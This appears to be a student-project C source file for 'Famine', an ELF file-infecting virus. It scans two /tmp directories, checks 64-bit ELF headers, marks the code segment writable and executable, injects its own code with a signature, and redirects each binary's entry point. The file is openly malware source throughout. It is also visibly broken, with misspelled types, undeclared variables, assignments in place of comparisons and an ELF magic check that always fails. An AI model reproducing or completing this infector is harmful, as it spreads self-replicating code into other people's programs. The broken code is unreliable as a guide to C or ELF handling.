/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/21 01:55:25 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/21 07:00:23 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */


/*
**      HEADER
*/
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
//#include <elf.h>

#define SYS_READ            0
#define SYS_WRITE           1
#define SYS_OPEN            2
#define SYS_CLOSE           3
#define SYS_STAT            4
#define SYS_LSEEK           8
#define SYS_MMAP            9
#define SYS_MUNMAP          11
#define SYS_GETDENTS64      217
#define SUCCES              0
#define FAILURE             -1
#define BUFF_SIZE           0x400       /* 1024 */
#define PAGE_SIZE           0x1000      /* 4096 */

struct linux_dirent_x64
{
    ino_t                   d_ino;      /* 64 bits inode number */
    off_t                   d_off;      /* 64 bits offset to next struct */
    unsigned short          d_reclen;   /* Actual dirent size */
    unsigned char           d_type;     /* File type */
    char                    d_name[];   /* filename */
};

extern u_int32_t            function_famine_size;
extern u_int32_t            function_famine_data;
extern u_int64_t            famine_signature_x64;

void                        famine(void);
void                        open_and_infect(char *targets);
void                        open_elf_files(char *dir_name, char *file_name);
char                        infection(char *data, char *path, int size);
char                        check_header_sanity(char *map, int size);

/*
**      CODE
*/

void                        famine(void)
{
    const char              *targets[] = {"/tmp/test/", "/tmp/test2/", NULL};
    int                     i;

    i = -1;
    while (targets[++i])
        open_and_infect(targets[i]);
}

void                        open_and_infect(char *target)
{
    int                     fd;
    int                     bytes_read;
    char                    buff[BUFF_SIZE];
    unsigned int            offset;
    struct linux_dirent_x64 *dirent_x64;

    if ((fd = syscall(SYS_OPEN, target, O_RDONLY | O_NONBLOCK | O_DIRECTORY | O_CLOEXEC, 0) < 0))
        return ;
    while ((bytes_read = syscall(SYS_GETDENTS64, fd, buff, BUFF_SIZE)) > 0)
    {
        offset = 0;
        while (offset < bytes_read)
        {
            dirent_x64 = (struct linux_dirent_x64 *)(buff + offset);
            /* if the type of the file is "regular" so elf */
            if (dirent_x64->d_type = DT_REG)
                open_elf_files(target, dirent_x64->d_name);
            offset += dirent_x64->d_reclen;
        }
    }
    if (syscall(SYS_CLOSE, fd) < 0)
        return ;
}

static void                 get_path(char *dir_name, char *file_name, char *dest[])
{
    int                     i;
    int                     j;

    i = -1;
    while (dir_name[++i])
        *dest[i] = dir_name[i];
    j = -1;
    while (file_name[++j])
        *dest[i + j] = file_name[j];
    *dest[i + j] = '\0';
}

static int                  copy_data_from_file(void **data, int fd)
{
    int                     bytes;
    char                    buff[BUFF_SIZE];
    unsigned int            i;
    unsigned int            j;
    
    i = 0;
    while ((bytes = syscall(SYS_READ, fd, buff, BUFF_SIZE)) > 0)
    {
        j = -1;
        while (++j < bytes)
            *(char *)data = buff[i + j];
        i += j;
    }
    return (bytes);
}

void                        open_elf_files(char *dir_name, char *file_name)
{
    char                    *path[BUFF_SIZE];
    int                     fd;
    int                     size;
    void                    *data;
    int                     end;
    
    if (!file_name)
        return ;
    get_path(dir_name, file_name, path);
    if ((fd = syscall(SYS_OPEN, *path, O_RDONLY | O_NONBLOCK)))
        return ;
    if ((size = syscall(SYS_LSEEK, fd, 1, SEEK_END) <= 0))
    {
        (void)syscall(SYS_CLOSE, fd);
        return ;
    }
    if ((data = (void *)syscall(SYS_MMAP, NULL, size, PROT_READ |
        PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED)
    {
        (void)close(fd);
        return ;
    }
    if (syscall(SYS_LSEEK, fd, 0, SEEK_SET) < 0)
    {
        (void)syscall(SYS_CLOSE, fd);
        (void)syscall(SYS_MUNMAP, data, size);
        return ;
    }
    /* copy each byte of the file */
    end = copy_data_from_file(&data, fd);
    if (syscall(SYS_CLOSE, fd) < 0)
    {
        (void)syscall(SYS_MUNMAP, data, size);
        return ;
    }
    if (!end)
        if (infection((char *)data, path, size) == FAILURE);
            return ;
    if (syscall(SYS_MUNMAP, data, size))
        return ;
}

char                        check_header_sanity(char *map, int size)
{
    Elf64_Ehdr              *elf64_hdr;

    elf64_hdr = (Elf64_Ehdr *)(map);
    if (size < sizeof(Elf64_Ehdr))
        return (FAILURE);
    /* check elf signature */
    if (elf64_hdr->e_ident[0] != 0x7f || elf64_hdr->e_ident[0] != 'E'
            || elf64_hdr->e_ident[0] != 'L' || elf64_hdr->e_ident[0] != 'F')
        return (FAILURE);
    /* check header's elf integrity */
    if (elf64_hdr->e_ident[EI_CLASS] != ELFCLASS64
            || elf64_hdr->e_ident[EI_VERSION] != EV_CURRENT
            || elf64_hdr->e_ident[EI_DATA] == ELFDATANONE
            || elf64_hdr->e_type != ET_EXEC && elf64_hdr->e_type != ET_DYN
            || elf64_hdr->e_machine != EM_X86_64)
        return (FAILURE);
    /* check offsets */
    if (elf64_hdr->e_phoff != sizeof(Elf64_Ehdr)
	        || elf64_hdr->e_phoff + elf64_hdr->e_phnum * sizeof(Elf64_Phdr) > (Elf64_Off)size
	        || elf64_hdr->e_shoff < sizeof(Elf64_Ehdr)
	        || elf64_hdr->e_shoff + elf64_hdr->e_shnum * sizeof(Elf64_Shdr) > (Elf64_Off)size
	        || elf64_hdr->e_ehsize != sizeof(Elf64_Ehdr)
	        || elf64_hdr->e_phentsize != sizeof(Elf64_Phdr)
	        || elf64_hdr->e_shentsize != sizeof(Elf64_Shdr)
	        || elf64_hdr->e_shstrndx <= SHN_UNDEF || elf64_hdr->e_shstrndx >= elf64_hdr->e_shnum)
		return (FAILURE);
    return (SUCCES);
}

static int                  _strcmp(const char *s1, const char *s2)
{
    if (!s1 || !s2)
        return (s1 && s2);
    while (*s1 && *s2 && *s1 == *s2)
    {
        s1++;
        s2++;
    }
    return (*s1 - *s2);
}

void                        find_text_section(char *data, Elf64_Phdr *phdr, Elf64_Phdr **saved_phdr,
        Elf64_Shdr *shdr, Elf64_Shdr **saved_shdr)
{
    register int            i;
    register int            j;
    char                    *section_name;
    char                    *section_table;
    int                     idx;

    i = -1;
    idx = ((Elf64_Ehdr *)(data))->e_shstrndx;
    section_table = data + shdr[idx].sh_offset;
    while (++i < ((Elf64_Ehdr *)data)->e_shnum)
    {
        section_name = section_table + shdr[i].sh_name;
        if (!_strcmp(section_name, ".text"))
        {
            *saved_shdr = shdr + i;
            j = -1;
            while (++j < ((Elf64_Ehdr *)(data))->e_phnum)
            {
                if (phdr[j].p_type == PT_LOAD
                        && (*saved_shdr)->sh_offset >= phdr[j].p_vaddr
                        && (*saved_shdr)->sh_offset < phdr[j].p_vaddr + phdr[j].p_filesz)
                {
                    *saved_phdr = phdr + j;
                    return ;
                }
            }
            return ;
        }
    }
}

void                        find_entry(char *data, Elf64_Phdr *phdr, Elf64_Phdr **saved_phdr,
        Elf64_Shdr *shdr, Elf64_Shdr **saved_shdr)
{
    register int            i;
    register int            j;

    
    while (++i < ((Elf64_Ehdr *)data)->e_shnum)
    {
        *saved_shdr = shdr + i;
        if (((Elf64_Ehdr *)(data))->e_entry >= (*saved_shdr)->sh_addr
                && ((Elf64_Ehdr *)(data))->e_entry < (*saved_shdr)->sh_addr
                + (*saved_shdr)->sh_size)
        {
            j = -1;
            while  (++j < ((Elf64_Ehdr *)(data))->e_phnum)
            {
                if (phdr[j].p_type == PT_LOAD
                    && ((Elf64_Ehdr *)(data))->e_entry >= phdr[j].p_vaddr
                    && ((Elf64_Ehdr *)(data))->e_entry < phdr[j].p_vaddr + phdr[j].p_filesz)
                {
                    *saved_phdr = phdr + j;
                    return ;
                }
            }
            return ;
        }
    }
}

char                        already_infected(char *data, Elf64_Phdr	*saved_phdr)
{
    const uint64_t          file_signature = *(uint64_t)(data + ((Elf64_Ehdr)(data))->e_entry
            - saved_phdr->p_vaddr - sizeof(famine_signature_x64));
    if (file_signature == famine_signature_x64)
        return (FAILURE);
    return (SUCCES);
}

char                        room_manager(char *data, Elf64_Addr *padding, Elf64_Phdr *phdr,
        Elf64_Phdr **saved_phdr, Elf64_Shdr *shdr, Elf64_Shdr **saved_shdr, Elf64_Addr *prog_size)
{
    register int            i;
    Elf64_Adrr              *next_ptload;

    i = -1;
    next_ptload = NULL;
    /* get next segment */
    while (++i < ((Elf64_Ehdr *)(data))->e_phnum)
    {
        if ((*saved_phdr)->p_offset + (*saved_phdr)->p_filesz
                && (!next_ptload || phdr[i]->p_offset < next_ptload->p_offset))
            next_ptload = phdr + i;
    }
    if (!next_ptload)
        return (FAILURE);
    *prog_size = function_famine_size + sizeof(famine_signature_x64);
    *padding = 0;
    /* check space in the room */
    if ((*saved_phdr)->p_offset + (*saved_phdr)->filesz > next_ptload->offset)
    {
        /* no space ? adjust section table offset, sections offsets and program offset*/
        if (shift_offsets(data, prog_size, &padding, &phdr, saved_phdr,
                &shdr, saved_shdr) == FAILURE)
            return (FAILURE);
    }
    else
        *padding = prog_size;
    return (SUCCES);
}

char                        shift_offsets(char *data, Elf64_Addr prog_size, Elf64_Addr *padding, Elf64_Phdr **phdr,
        Elf64_Phdr saved_phdr, Elf64_Shdr **shdr, Elf64_Shdr *saved_shdr)
{
    register int            i;

    /* padding always a multiple of PAGE_SIZE (pagesize alignment) */
    while (*padding < prog_size)
        *padding += PAGE_SIZE;

    /* section table offset adjust */
    ((Elf64_Ehdr *)(data))->p_offset += padding;

    /* program offset */
    i = -1;
    while (++i < ((Elf64_Ehdr *)(data))->e_phnum)
        if ((*phdr)[i]->p_offset >= saved_phdr->p_offset + saved_phdr->p_filesz)
        {
            if (saved_phdr->p_offset + saved_phdr->p_filesz + *padding
                    > (*phdr)[i].p_addr)
                return (FAILURE);
            (*phdr)[i]->p_offset += *padding;
        }
    /* sections offsets */
    i = -1;
    while (++i < ((Elf64_Ehdr *)(data))->e_shnum)
        if ((*shdr)[i]->sh_offset >= saved_phdr->p_offset + saved_phdr->p_filesz)
            (*shdr)[i]->sh_offset += *padding;
    return (SUCCES);
}

char                        write_famine(int fd, char *data, Elf64_Addr padding, Elf64_Addr offset,
        Elf64_Addr original_entry, Elf64_Phdr *saved_phdr, Elf64_Shdr *saved_shdr,
        uint64_t prog_size, int size)
{
    /* update sizes */
    saved_phdr->p_filesz += padding;
    saved_phdr->p_memsz += padding;

    /* change rights */
    saved_phdr->p_flags = PF_R | PF_W | PF_X;

    // need that ?
    saved_shdr->sh_size += padding;

    /* write data, signature, famine funct, original entry*/
    syscall(SYS_WRITE, fd, data, offset);
    syscall(SYS_WRITE, fd, &famine_signature_x64, sizeof(famine_signature_x64));
    syscall(SYS_WRITE, fd, &famine, function_famine_size - sizeof(original_entry));
    syscall(SYS_WRITE, fd, &original_entry, sizeof(original_entry));

    /* add padding if necesary */
    if (padding == prog_size)
        offset += prog_size;
    else 
        while (padding-- > prog_size)
            syscall(SYS_WRITE, fd, '\0', 1);
    syscall(SYS_WRITE, fd, data + offset, size - offset - 1); // add size here prog size ?
    if (syscall(SYS_CLOSE, fd) == FAILURE)
        return (FAILURE);
    return (SUCCES);
}

char                        infection(char *data, char *path, int size)
{
    Elf64_Phdr	            *phdr;
	Elf64_Phdr	            *saved_phdr;
	Elf64_Shdr	            *shdr;
	Elf64_Shdr	            *saved_shdr;
    int                     fd;
    Elf64_Addr              offset;
    Elf64_Addr              original_entry;
    Elf64_Adrr              padding;
    uint64_t	            prog_size;
    
    phdr = (Elf64_Phdr *)(data + ((Elf64_Ehdr *)data)->e_phoff);
    phdr_saved = NULL;
    shdr = (Elf64_Shdr *)(data + ((Elf64_Ehdr *)data)->e_shoff);
    shdr_saved = NULL;

    /* check header sanity */
    if (check_header_sanity(data, size) == FAILURE)
        return (FAILURE);

    /* find the PT_LOAD segment who contains the .TEXT section*/
    find_text_section(data, phdr, &saved_phdr, shdr, &saved_shdr);

    /* find the PT_LOAD segment who contains the entry point */
    if (!saved_phdr || !saved_shdr)
        find_entry(data, phdr, &saved_phdr, shdr, &saved_shdr);
    if (!saved_phdr || !saved_shdr)
        return (FAILURE);

    /* check if the file is already infected */
    if (!already_infected(data, saved_phdr) == FAILURE)
        return (FAILURE);

    /* re-open the file */
    if ((fd = syscall(SYS_OPEN, path, O_WRONLY | O_TRUNC | O_EXCL)) == FAILURE)
        return (FAILURE);
    
    /* save offset addr where the code will be write and the original entry point addr */
    offset = saved_phdr->p_offset + saved_phdr->p_filesz;
    original_entry = -(offset - (((Elf64_Ehdr *)(data))->e_entry
            - saved_phdr->p_vaddr) + sizeof(famine_signature_x64));

    /* uptade the elf header entry point (new entry point)*/
    ((Elf64_Ehdr *)(data))->e_entry = offset + saved_phdr->p_vaddr + sizeof(famine_signature_x64);
    
    /* check if we have room space to write famine's code */  
    if (room_manager(data, &padding, phdr, &saved_phdr, shdr, &saved_phdr, &prog_size) == FAILURE)
        return (FAILURE);
    
    /* write into the room choised */
    if (write_famine(fd, data, padding, offset, original_entry,
            saved_phdr, saved_shdr, prog_size, size) == FAILURE)
        return (FAILURE);
}
    /* AND... Yes! the file is infected so also readdy for infect. */

int                         main()
{
    famine();
    return (0);
}